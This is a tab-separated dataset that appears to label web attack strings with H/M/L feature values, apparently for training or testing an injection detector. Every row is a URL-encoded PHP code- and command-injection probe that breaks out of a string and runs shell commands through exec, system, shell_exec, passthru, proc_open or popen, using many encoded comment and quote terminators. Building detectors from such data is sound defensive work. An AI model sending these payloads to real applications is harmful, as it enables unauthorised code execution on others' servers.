attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
");}print(`echo%20wqbrfd;echo%20$((85%2b53));echo%20wqbrfd;echo%20wqbrfd`)%3b%255c%255cwqbrfd	H	L	L	M	M	M	L	M	
");}print(`echo%20hwagvj%0aecho%20$((14%2b22))%0aecho%20hwagvj%0aecho%20hwagvj`)%3b%25255c%25255chwagvj	L	L	L	L	M	M	L	M	
");}print(`echo%20xilsbl\necho%20$((74%2b71))\necho%20xilsbl\necho%20xilsbl`)%3b%2525255c%2525255cxilsbl	H	L	L	L	M	M	L	M	
");}print(`echo%20ydwezs;echo%20$((87%2b70));echo%20ydwezs;echo%20ydwezs`)%3b//ydwezs	H	L	L	M	M	M	L	M	
");}print(`echo%20jfbzlz%0aecho%20$((64%2b83))%0aecho%20jfbzlz%0aecho%20jfbzlz`)%3b//jfbzlz	L	L	L	L	M	M	L	M	
");}print(`echo%20racxoi`.`echo%20$((81%2b11))`.`echo%20racxoi`.`echo%20racxoi`)%3b%23racxoi	H	L	L	L	M	M	L	M	
");}print(`echo%20dklyzk;echo%20$((5%2b95));echo%20dklyzk;echo%20dklyzk`)%3b%2523dklyzk	H	L	L	M	M	M	L	M	
");}print(`echo%20ysgcab%0aecho%20$((76%2b3))%0aecho%20ysgcab%0aecho%20ysgcab`)%3b%252523ysgcab	L	L	L	L	M	M	L	M	
");}print(`echo%20cksiuk\necho%20$((45%2b4))\necho%20cksiuk\necho%20cksiuk`)%3b%25252523cksiuk	H	L	L	L	M	M	L	M	
");}print(`echo%20lvfgxd`.`echo%20$((25%2b23))`.`echo%20lvfgxd`.`echo%20lvfgxd`)%3b.%22lvfgxd	H	L	L	L	M	M	L	M	
");}print(`echo%20ibfqkh;echo%20$((32%2b31));echo%20ibfqkh;echo%20ibfqkh`)%3b.%2522ibfqkh	H	L	L	M	M	M	L	M	
");}print(`echo%20mpxdzz%0aecho%20$((78%2b91))%0aecho%20mpxdzz%0aecho%20mpxdzz`)%3b.%252522mpxdzz	L	L	L	L	M	M	L	M	
");}print(`echo%20ghiscr\necho%20$((96%2b53))\necho%20ghiscr\necho%20ghiscr`)%3b.%25252522ghiscr	H	L	L	L	M	M	L	M	
");}print(`echo%20uhqkli`.`echo%20$((50%2b4))`.`echo%20uhqkli`.`echo%20uhqkli`)%3b.%27uhqkli	H	L	L	L	M	M	L	M	
");}print(`echo%20mditeg;echo%20$((51%2b68));echo%20mditeg;echo%20mditeg`)%3b.%2527mditeg	H	L	L	M	M	M	L	M	
");}print(`echo%20rkxnwh%0aecho%20$((63%2b75))%0aecho%20rkxnwh%0aecho%20rkxnwh`)%3b.%252527rkxnwh	L	L	L	L	M	M	L	M	
");}print(`echo%20rxuktf\necho%20$((42%2b2))\necho%20rxuktf\necho%20rxuktf`)%3b.%25252527rxuktf	H	L	L	L	M	M	L	M	
");}print(`echo%20nuvvka;echo%20$((27%2b5));echo%20nuvvka;echo%20nuvvka`)%3b%2529%257dnuvvka	H	L	L	M	M	M	L	M	
");}print(`echo%20qnfoee%0aecho%20$((91%2b41))%0aecho%20qnfoee%0aecho%20qnfoee`)%3b%252529%25257dqnfoee	L	L	L	L	M	M	L	M	
");}print(`echo%20sfbdle\necho%20$((73%2b49))\necho%20sfbdle\necho%20sfbdle`)%3b%25252529%2525257dsfbdle	H	L	L	L	M	M	L	M	
${exec(print(`echo%20hiumzj`.`echo%20$((69%2b37))`.`echo%20hiumzj`.`echo%20hiumzj`)%3bhiumzj	H	M	L	L	M	M	L	M	
${exec(print(`echo%20bdbpsz;echo%20$((87%2b50));echo%20bdbpsz;echo%20bdbpsz`)%3bbdbpsz	H	M	L	M	M	M	L	M	
${exec(print(`echo%20uvbbnb%0aecho%20$((5%2b32))%0aecho%20uvbbnb%0aecho%20uvbbnb`)%3buvbbnb	L	M	L	L	M	M	L	M	
${exec(print(`echo%20itagsp\necho%20$((63%2b35))\necho%20itagsp\necho%20itagsp`)%3bitagsp	H	M	L	L	M	M	L	M	
${exec(print(`echo%20jfzdgz`.`echo%20$((16%2b38))`.`echo%20jfzdgz`.`echo%20jfzdgz`)%3b%5c%5cjfzdgz	H	M	L	L	M	M	L	M	
${exec(print(`echo%20yymyqb;echo%20$((54%2b65));echo%20yymyqb;echo%20yymyqb`)%3b%255c%255cyymyqb	H	M	L	M	M	M	L	M	
${exec(print(`echo%20qtlcrd%0aecho%20$((90%2b5))%0aecho%20qtlcrd%0aecho%20qtlcrd`)%3b%25255c%25255cqtlcrd	L	M	L	L	M	M	L	M	
${exec(print(`echo%20qrlvmm\necho%20$((41%2b19))\necho%20qrlvmm\necho%20qrlvmm`)%3b%2525255c%2525255cqrlvmm	H	M	L	L	M	M	L	M	
${exec(print(`echo%20xresbn`.`echo%20$((9%2b10))`.`echo%20xresbn`.`echo%20xresbn`)%3b//xresbn	H	M	L	L	M	M	L	M	
${exec(print(`echo%20yfvaoj;echo%20$((71%2b65));echo%20yfvaoj;echo%20yfvaoj`)%3b//yfvaoj	H	M	L	M	M	M	L	M	
${exec(print(`echo%20cpyizr%0aecho%20$((58%2b63))%0aecho%20cpyizr%0aecho%20cpyizr`)%3b//cpyizr	L	M	L	L	M	M	L	M	
${exec(print(`echo%20ufjnmu\necho%20$((69%2b30))\necho%20ufjnmu\necho%20ufjnmu`)%3b//ufjnmu	H	M	L	L	M	M	L	M	
${exec(print(`echo%20gkzrwd`.`echo%20$((93%2b76))`.`echo%20gkzrwd`.`echo%20gkzrwd`)%3b%23gkzrwd	H	M	L	L	M	M	L	M	
${exec(print(`echo%20asbmqm;echo%20$((65%2b46));echo%20asbmqm;echo%20asbmqm`)%3b%2523asbmqm	H	M	L	M	M	M	L	M	
${exec(print(`echo%20uznhta%0aecho%20$((79%2b41))%0aecho%20uznhta%0aecho%20uznhta`)%3b%252523uznhta	L	M	L	L	M	M	L	M	
${exec(print(`echo%20twzntz\necho%20$((85%2b67))\necho%20twzntz\necho%20twzntz`)%3b%25252523twzntz	H	M	L	L	M	M	L	M	
${exec(print(`echo%20bghsse`.`echo%20$((10%2b79))`.`echo%20bghsse`.`echo%20bghsse`)%3b.%22bghsse	H	M	L	L	M	M	L	M	
${exec(print(`echo%20gyabgy;echo%20$((9%2b52));echo%20gyabgy;echo%20gyabgy`)%3b.%2522gyabgy	H	M	L	M	M	M	L	M	
${exec(print(`echo%20hfmdnb%0aecho%20$((56%2b41))%0aecho%20hfmdnb%0aecho%20hfmdnb`)%3b.%252522hfmdnb	L	M	L	L	M	M	L	M	
${exec(print(`echo%20ktggnj\necho%20$((80%2b87))\necho%20ktggnj\necho%20ktggnj`)%3b.%25252522ktggnj	H	M	L	L	M	M	L	M	
${exec(print(`echo%20ugdxmc`.`echo%20$((12%2b69))`.`echo%20ugdxmc`.`echo%20ugdxmc`)%3b.%27ugdxmc	H	M	L	L	M	M	L	M	
${exec(print(`echo%20chwxxr;echo%20$((19%2b13));echo%20chwxxr;echo%20chwxxr`)%3b.%2527chwxxr	H	M	L	M	M	M	L	M	
${exec(print(`echo%20ohftia%0aecho%20$((97%2b31))%0aecho%20ohftia%0aecho%20ohftia`)%3b.%252527ohftia	L	M	L	L	M	M	L	M	
${exec(print(`echo%20jpkqmc\necho%20$((63%2b12))\necho%20jpkqmc\necho%20jpkqmc`)%3b.%25252527jpkqmc	H	M	L	L	M	M	L	M	
${exec(print(`echo%20srpmsx`.`echo%20$((59%2b33))`.`echo%20srpmsx`.`echo%20srpmsx`)%29%7dsrpmsx	H	M	L	L	M	M	L	M	
${exec(print(`echo%20ihgvip;echo%20$((98%2b57));echo%20ihgvip;echo%20ihgvip`)%3b%2529%257dihgvip	H	M	L	M	M	M	L	M	
${exec(print(`echo%20lwnhyj%0aecho%20$((0%2b21))%0aecho%20lwnhyj%0aecho%20lwnhyj`)%3b%252529%25257dlwnhyj	L	M	L	L	M	M	L	M	
${exec(print(`echo%20aojpqw\necho%20$((18%2b92))\necho%20aojpqw\necho%20aojpqw`)%3b%25252529%2525257daojpqw	H	M	L	L	M	M	L	M	
${system(print(`echo%20yvoamz;echo%20$((9%2b69));echo%20yvoamz;echo%20yvoamz`)%3byvoamz	H	L	L	M	M	M	L	M	
${system(print(`echo%20ediedw%0aecho%20$((27%2b90))%0aecho%20ediedw%0aecho%20ediedw`)%3bediedw	L	L	L	L	M	M	L	M	
${system(print(`echo%20gvuxpa;echo%20$((23%2b14));echo%20gvuxpa;echo%20gvuxpa`)%3b%255c%255cgvuxpa	H	L	L	M	M	M	L	M	
${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhcdbt`)%3b%25255c%25255cyhcdbt	L	L	L	L	M	M	L	M	
${system(print(`echo%20lhbytt\necho%20$((48%2b0))\necho%20lhbytt\necho%20lhbytt`)%3b%2525255c%2525255clhbytt	H	L	L	L	M	M	L	M	
${system(print(`echo%20qxzkbz;echo%20$((59%2b25));echo%20qxzkbz;echo%20qxzkbz`)%3b//qxzkbz	H	L	L	M	M	M	L	M	
${system(print(`echo%20mafxyf%0aecho%20$((23%2b63))%0aecho%20mafxyf%0aecho%20mafxyf`)%3b//mafxyf	L	L	L	L	M	M	L	M	
${system(print(`echo%20xpecbv`.`echo%20$((14%2b77))`.`echo%20xpecbv`.`echo%20xpecbv`)%3b%23xpecbv	H	L	L	L	M	M	L	M	
${system(print(`echo%20lwtwct;echo%20$((98%2b35));echo%20lwtwct;echo%20lwtwct`)%3b%2523lwtwct	H	L	L	M	M	M	L	M	
${system(print(`echo%20rsgszk%0aecho%20$((0%2b7))%0aecho%20rsgszk%0aecho%20rsgszk`)%3b%252523rsgszk	L	L	L	L	M	M	L	M	
${system(print(`echo%20mqqjpg\necho%20$((72%2b19))\necho%20mqqjpg\necho%20mqqjpg`)%3b%25252523mqqjpg	H	L	L	L	M	M	L	M	
${system(print(`echo%20wjamji`.`echo%20$((95%2b52))`.`echo%20wjamji`.`echo%20wjamji`)%3b.%22wjamji	H	L	L	L	M	M	L	M	
${system(print(`echo%20arcvvc;echo%20$((7%2b90));echo%20arcvvc;echo%20arcvvc`)%3b.%2522arcvvc	H	L	L	M	M	M	L	M	
${system(print(`echo%20cklwbh%0aecho%20$((38%2b7))%0aecho%20cklwbh%0aecho%20cklwbh`)%3b.%252522cklwbh	L	L	L	L	M	M	L	M	
${system(print(`echo%20czaspt\necho%20$((18%2b64))\necho%20czaspt\necho%20czaspt`)%3b.%25252522czaspt	H	L	L	L	M	M	L	M	
${system(print(`echo%20tdekpw`.`echo%20$((36%2b67))`.`echo%20tdekpw`.`echo%20tdekpw`)%3b.%27tdekpw	H	L	L	L	M	M	L	M	
${system(print(`echo%20ftplbi;echo%20$((56%2b37));echo%20ftplbi;echo%20ftplbi`)%3b.%2527ftplbi	H	L	L	M	M	M	L	M	
${system(print(`echo%20rklpmm%0aecho%20$((66%2b91))%0aecho%20rklpmm%0aecho%20rklpmm`)%3b.%252527rklpmm	L	L	L	L	M	M	L	M	
${system(print(`echo%20iwaagd\necho%20$((70%2b17))\necho%20iwaagd\necho%20iwaagd`)%3b.%25252527iwaagd	H	L	L	L	M	M	L	M	
${system(print(`echo%20ezfnse;echo%20$((38%2b74));echo%20ezfnse;echo%20ezfnse`)%3b%2529%257dezfnse	H	L	L	M	M	M	L	M	
${system(print(`echo%20ddvdpm%0aecho%20$((1%2b17))%0aecho%20ddvdpm%0aecho%20ddvdpm`)%3b%252529%25257dddvdpm	L	L	L	L	M	M	L	M	
${system(print(`echo%20yysfal\necho%20$((70%2b5))\necho%20yysfal\necho%20yysfal`)%3b%25252529%2525257dyysfal	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20fdgahq`.`echo%20$((87%2b87))`.`echo%20fdgahq`.`echo%20fdgahq`)%3bfdgahq	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20oapdkw;echo%20$((19%2b47));echo%20oapdkw;echo%20oapdkw`)%3boapdkw	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20ntilfz%0aecho%20$((24%2b1))%0aecho%20ntilfz%0aecho%20ntilfz`)%3bntilfz	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20ltjdnd\necho%20$((85%2b41))\necho%20ltjdnd\necho%20ltjdnd`)%3bltjdnd	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20nslpbw`.`echo%20$((95%2b54))`.`echo%20nslpbw`.`echo%20nslpbw`)%3b%5c%5cnslpbw	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20mvsqei;echo%20$((38%2b17));echo%20mvsqei;echo%20mvsqei`)%3b%255c%255cmvsqei	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20vzxaso%0aecho%20$((97%2b88))%0aecho%20vzxaso%0aecho%20vzxaso`)%3b%25255c%25255cvzxaso	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20krlqhl\necho%20$((37%2b53))\necho%20krlqhl\necho%20krlqhl`)%3b%2525255c%2525255ckrlqhl	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20ctgkdz`.`echo%20$((66%2b54))`.`echo%20ctgkdz`.`echo%20ctgkdz`)%3b//ctgkdz	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20eddlos;echo%20$((48%2b73));echo%20eddlos;echo%20eddlos`)%3b//eddlos	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20hulcyo%0aecho%20$((33%2b24))%0aecho%20hulcyo%0aecho%20hulcyo`)%3b//hulcyo	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20cvxuub\necho%20$((15%2b41))\necho%20cvxuub\necho%20cvxuub`)%3b//cvxuub	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20sicokb`.`echo%20$((59%2b30))`.`echo%20sicokb`.`echo%20sicokb`)%3b%23sicokb	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20einnui;echo%20$((9%2b15));echo%20einnui;echo%20einnui`)%3b%2523einnui	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20fbjswr%0aecho%20$((91%2b71))%0aecho%20fbjswr%0aecho%20fbjswr`)%3b%252523fbjswr	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20qqzsxu\necho%20$((69%2b44))\necho%20qqzsxu\necho%20qqzsxu`)%3b%25252523qqzsxu	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20zevnby`.`echo%20$((97%2b49))`.`echo%20zevnby`.`echo%20zevnby`)%3b.%22zevnby	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20wbzbze;echo%20$((19%2b87));echo%20wbzbze;echo%20wbzbze`)%3b.%2522wbzbze	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20kiaclj%0aecho%20$((8%2b79))%0aecho%20kiaclj%0aecho%20kiaclj`)%3b.%252522kiaclj	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20nhqiae\necho%20$((63%2b50))\necho%20nhqiae\necho%20nhqiae`)%3b.%25252522nhqiae	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20ckfbet`.`echo%20$((33%2b76))`.`echo%20ckfbet`.`echo%20ckfbet`)%3b.%27ckfbet	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20bmqbvj;echo%20$((82%2b52));echo%20bmqbvj;echo%20bmqbvj`)%3b.%2527bmqbvj	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20vekgiy%0aecho%20$((15%2b47))%0aecho%20vekgiy%0aecho%20vekgiy`)%3b.%252527vekgiy	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20vbrhzs\necho%20$((17%2b48))\necho%20vbrhzs\necho%20vbrhzs`)%3b.%25252527vbrhzs	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20pwwuen`.`echo%20$((49%2b57))`.`echo%20pwwuen`.`echo%20pwwuen`)%29%7dpwwuen	H	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20oynpcp;echo%20$((84%2b51));echo%20oynpcp;echo%20oynpcp`)%3b%2529%257doynpcp	H	L	L	M	M	M	L	M	
${shell_exec(print(`echo%20dpvesg%0aecho%20$((76%2b66))%0aecho%20dpvesg%0aecho%20dpvesg`)%3b%252529%25257ddpvesg	L	L	L	L	M	M	L	M	
${shell_exec(print(`echo%20rjfpqu\necho%20$((15%2b60))\necho%20rjfpqu\necho%20rjfpqu`)%3b%25252529%2525257drjfpqu	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20clqqrv;echo%20$((21%2b24));echo%20clqqrv;echo%20clqqrv`)%3bclqqrv	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20tydnll%0aecho%20$((23%2b29))%0aecho%20tydnll%0aecho%20tydnll`)%3btydnll	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20jrxxwa;echo%20$((92%2b68));echo%20jrxxwa;echo%20jrxxwa`)%3b%255c%255cjrxxwa	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20kxvpha%0aecho%20$((20%2b43))%0aecho%20kxvpha%0aecho%20kxvpha`)%3b%25255c%25255ckxvpha	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20oljesc\necho%20$((53%2b40))\necho%20oljesc\necho%20oljesc`)%3b%2525255c%2525255coljesc	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20dbdibn;echo%20$((7%2b5));echo%20dbdibn;echo%20dbdibn`)%3b//dbdibn	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20nsbwmt%0aecho%20$((16%2b44))%0aecho%20nsbwmt%0aecho%20nsbwmt`)%3b//nsbwmt	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20oaaisj`.`echo%20$((72%2b52))`.`echo%20oaaisj`.`echo%20oaaisj`)%3b%23oaaisj	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20pyelub;echo%20$((29%2b64));echo%20pyelub;echo%20pyelub`)%3b%2523pyelub	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20fhtlvg%0aecho%20$((8%2b87))%0aecho%20fhtlvg%0aecho%20fhtlvg`)%3b%252523fhtlvg	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20qpyrbq\necho%20$((35%2b79))\necho%20qpyrbq\necho%20qpyrbq`)%3b%25252523qpyrbq	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20uounqt`.`echo%20$((2%2b66))`.`echo%20uounqt`.`echo%20uounqt`)%3b.%22uounqt	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20hrcxng;echo%20$((6%2b10));echo%20hrcxng;echo%20hrcxng`)%3b.%2522hrcxng	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20kruyim%0aecho%20$((16%2b77))%0aecho%20kruyim%0aecho%20kruyim`)%3b.%252522kruyim	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20csynwp\necho%20$((93%2b10))\necho%20csynwp\necho%20csynwp`)%3b.%25252522csynwp	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20rbchid`.`echo%20$((71%2b83))`.`echo%20rbchid`.`echo%20rbchid`)%3b.%27rbchid	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20xuwnep;echo%20$((61%2b20));echo%20xuwnep;echo%20xuwnep`)%3b.%2527xuwnep	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20qkcaag%0aecho%20$((61%2b22))%0aecho%20qkcaag%0aecho%20qkcaag`)%3b.%252527qkcaag	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20egtrqh\necho%20$((17%2b5))\necho%20egtrqh\necho%20egtrqh`)%3b.%25252527egtrqh	H	L	L	L	M	M	L	M	
${passthru(print(`echo%20cygoxx;echo%20$((41%2b31));echo%20cygoxx;echo%20cygoxx`)%3b%2529%257dcygoxx	H	L	L	M	M	M	L	M	
${passthru(print(`echo%20oswwft%0aecho%20$((92%2b42))%0aecho%20oswwft%0aecho%20oswwft`)%3b%252529%25257doswwft	L	L	L	L	M	M	L	M	
${passthru(print(`echo%20ovsnxt\necho%20$((21%2b17))\necho%20ovsnxt\necho%20ovsnxt`)%3b%25252529%2525257dovsnxt	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20tiyjyd`.`echo%20$((86%2b26))`.`echo%20tiyjyd`.`echo%20tiyjyd`)%3btiyjyd	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20xakqyf;echo%20$((41%2b51));echo%20xakqyf;echo%20xakqyf`)%3bxakqyf	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20wmsmfm%0aecho%20$((4%2b30))%0aecho%20wmsmfm%0aecho%20wmsmfm`)%3bwmsmfm	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20fcanmp\necho%20$((61%2b35))\necho%20fcanmp\necho%20fcanmp`)%3bfcanmp	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20bufrzn`.`echo%20$((99%2b37))`.`echo%20bufrzn`.`echo%20bufrzn`)%3b%5c%5cbufrzn	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20skxdus;echo%20$((67%2b97));echo%20skxdus;echo%20skxdus`)%3b%255c%255cskxdus	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20sqzpmj%0aecho%20$((94%2b63))%0aecho%20sqzpmj%0aecho%20sqzpmj`)%3b%25255c%25255csqzpmj	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20zmukgp\necho%20$((9%2b61))\necho%20zmukgp\necho%20zmukgp`)%3b%2525255c%2525255czmukgp	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20kdoeok`.`echo%20$((74%2b18))`.`echo%20kdoeok`.`echo%20kdoeok`)%3b//kdoeok	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20rtnmau;echo%20$((3%2b92));echo%20rtnmau;echo%20rtnmau`)%3b//rtnmau	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20hedlvc%0aecho%20$((95%2b18))%0aecho%20hedlvc%0aecho%20hedlvc`)%3b//hedlvc	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20kndtdg\necho%20$((98%2b53))\necho%20kndtdg\necho%20kndtdg`)%3b//kndtdg	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20bbsvgq`.`echo%20$((42%2b81))`.`echo%20bbsvgq`.`echo%20bbsvgq`)%3b%23bbsvgq	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20lufxaf;echo%20$((85%2b77));echo%20lufxaf;echo%20lufxaf`)%3b%2523lufxaf	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20bpihji%0aecho%20$((94%2b16))%0aecho%20bpihji%0aecho%20bpihji`)%3b%252523bpihji	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20srvisb\necho%20$((34%2b18))\necho%20srvisb\necho%20srvisb`)%3b%25252523srvisb	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20kzlogk`.`echo%20$((4%2b23))`.`echo%20kzlogk`.`echo%20kzlogk`)%3b.%22kzlogk	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20mlsoyz;echo%20$((72%2b12));echo%20mlsoyz;echo%20mlsoyz`)%3b.%2522mlsoyz	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20jxtiwp%0aecho%20$((97%2b60))%0aecho%20jxtiwp%0aecho%20jxtiwp`)%3b.%252522jxtiwp	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20ebzmpw\necho%20$((54%2b99))\necho%20ebzmpw\necho%20ebzmpw`)%3b.%25252522ebzmpw	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20cpkmzs`.`echo%20$((71%2b91))`.`echo%20cpkmzs`.`echo%20cpkmzs`)%3b.%27cpkmzs	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20hwbqfg;echo%20$((79%2b43));echo%20hwbqfg;echo%20hwbqfg`)%3b.%2527hwbqfg	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20tdpgnl%0aecho%20$((89%2b52))%0aecho%20tdpgnl%0aecho%20tdpgnl`)%3b.%252527tdpgnl	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20jqueex\necho%20$((81%2b77))\necho%20jqueex\necho%20jqueex`)%3b.%25252527jqueex	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20eallnu`.`echo%20$((18%2b91))`.`echo%20eallnu`.`echo%20eallnu`)%29%7deallnu	H	L	L	L	M	M	L	M	
${proc_open(print(`echo%20rmmuog;echo%20$((61%2b62));echo%20rmmuog;echo%20rmmuog`)%3b%2529%257drmmuog	H	L	L	M	M	M	L	M	
${proc_open(print(`echo%20twetum%0aecho%20$((82%2b35))%0aecho%20twetum%0aecho%20twetum`)%3b%252529%25257dtwetum	L	L	L	L	M	M	L	M	
${proc_open(print(`echo%20gseibk\necho%20$((71%2b35))\necho%20gseibk\necho%20gseibk`)%3b%25252529%2525257dgseibk	H	L	L	L	M	M	L	M	
${popen(print(`echo%20vgnvlg`.`echo%20$((76%2b39))`.`echo%20vgnvlg`.`echo%20vgnvlg`)%3bvgnvlg	H	L	L	L	M	M	L	M	
${popen(print(`echo%20iwfpxg;echo%20$((92%2b70));echo%20iwfpxg;echo%20iwfpxg`)%3biwfpxg	H	L	L	M	M	M	L	M	
${popen(print(`echo%20rwksah%0aecho%20$((18%2b34))%0aecho%20rwksah%0aecho%20rwksah`)%3brwksah	L	L	L	L	M	M	L	M	
${popen(print(`echo%20tbfymh\necho%20$((44%2b94))\necho%20tbfymh\necho%20tbfymh`)%3btbfymh	H	L	L	L	M	M	L	M	
${popen(print(`echo%20yyafet`.`echo%20$((62%2b68))`.`echo%20yyafet`.`echo%20yyafet`)%3b%5c%5cyyafet	H	L	L	L	M	M	L	M	
${popen(print(`echo%20atleff;echo%20$((90%2b9));echo%20atleff;echo%20atleff`)%3b%255c%255catleff	H	L	L	M	M	M	L	M	
${popen(print(`echo%20jdfwvw%0aecho%20$((92%2b86))%0aecho%20jdfwvw%0aecho%20jdfwvw`)%3b%25255c%25255cjdfwvw	L	L	L	L	M	M	L	M	
${popen(print(`echo%20uqcxvd\necho%20$((60%2b78))\necho%20uqcxvd\necho%20uqcxvd`)%3b%2525255c%2525255cuqcxvd	H	L	L	L	M	M	L	M	
${popen(print(`echo%20pbsyuk`.`echo%20$((49%2b23))`.`echo%20pbsyuk`.`echo%20pbsyuk`)%3b//pbsyuk	H	L	L	L	M	M	L	M	
${popen(print(`echo%20uycupp;echo%20$((99%2b36));echo%20uycupp;echo%20uycupp`)%3b//uycupp	H	L	L	M	M	M	L	M	
${popen(print(`echo%20ahqlix%0aecho%20$((35%2b21))%0aecho%20ahqlix%0aecho%20ahqlix`)%3b//ahqlix	L	L	L	L	M	M	L	M	
${popen(print(`echo%20rwziyd\necho%20$((45%2b92))\necho%20rwziyd\necho%20rwziyd`)%3b//rwziyd	H	L	L	L	M	M	L	M	
${popen(print(`echo%20xgfdzu`.`echo%20$((14%2b6))`.`echo%20xgfdzu`.`echo%20xgfdzu`)%3b%23xgfdzu	H	L	L	L	M	M	L	M	
${popen(print(`echo%20vdxxji;echo%20$((50%2b12));echo%20vdxxji;echo%20vdxxji`)%3b%2523vdxxji	H	L	L	M	M	M	L	M	
${popen(print(`echo%20uwoafs%0aecho%20$((11%2b42))%0aecho%20uwoafs%0aecho%20uwoafs`)%3b%252523uwoafs	L	L	L	L	M	M	L	M	
${popen(print(`echo%20kchopx\necho%20$((77%2b78))\necho%20kchopx\necho%20kchopx`)%3b%25252523kchopx	H	L	L	L	M	M	L	M	
${popen(print(`echo%20pbzygx`.`echo%20$((38%2b4))`.`echo%20pbzygx`.`echo%20pbzygx`)%3b.%22pbzygx	H	L	L	L	M	M	L	M	
